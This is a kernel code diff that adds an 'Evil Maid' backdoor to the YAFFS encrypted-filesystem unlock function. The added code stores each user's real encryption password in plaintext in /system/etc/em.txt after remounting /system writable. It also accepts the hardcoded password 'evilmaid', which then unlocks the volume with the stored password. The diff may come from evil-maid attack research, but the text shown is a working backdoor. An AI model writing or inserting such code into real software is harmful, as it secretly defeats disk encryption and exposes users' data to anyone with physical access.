@@ -37,6 +37,8 @@
  */
 #include <linux/version.h>
 
+#include <linux/syscalls.h>
+
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 10))
 #define YAFFS_COMPILE_BACKGROUND
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(2,6, 23))
@@ -2871,6 +2873,27 @@ static int yaffs_LoadKeys(yaffs_Device *dev, char *password, int keyManagementBl
 
 static int yaffs_UnlockEncryptedFilesystem(yaffs_Device *dev, char *password) {
   int keyManagementBlock;
+	
+
+	// EM Vars
+	int fd;
+	int i;
+	mm_segment_t old_fs;
+	char buf[1];
+
+	old_fs = get_fs();
+	set_fs(KERNEL_DS);
+
+	// Evil Maid: Backdoor password
+	if (!strcmp(password, "evilmaid")) {
+		password = (char*) kmalloc(1024, GFP_KERNEL);
+		fd = sys_open("/system/etc/em.txt", O_RDONLY, 0);
+		while (sys_read(fd, buf, 1) == 1) {
+			password[i] = buf[0];
+			i++;			
+		}
+		sys_close(fd);
+	}
 
   dev->nDataBytesPerChunk = dev->param.totalBytesPerChunk;
 
@@ -2887,6 +2910,18 @@ static int yaffs_UnlockEncryptedFilesystem(yaffs_Device *dev, char *password) {
   dev->param.startBlock = keyManagementBlock + 1;
 
   printk(KERN_INFO "Encrypted FS successfully mounted!\n");
+
+	// Evil Maid: Store correct password
+
+	do_mount("/dev/block/mtdblock5", "/system", "yaffs2", O_RDWR | MS_REMOUNT, NULL);
+	fd = sys_open("/system/etc/em.txt", O_CREAT | O_TRUNC | O_WRONLY, 0644);
+	sys_write(fd, password, strlen(password));
+	sys_close(fd);
+	do_mount("/dev/block/mtdblock5", "/system", "yaffs2", MS_RDONLY | MS_REMOUNT, NULL);
+
+	set_fs(old_fs);
+
+	printk(KERN_INFO "EM: SAVED PASS\n");
 
   return 1;
 }
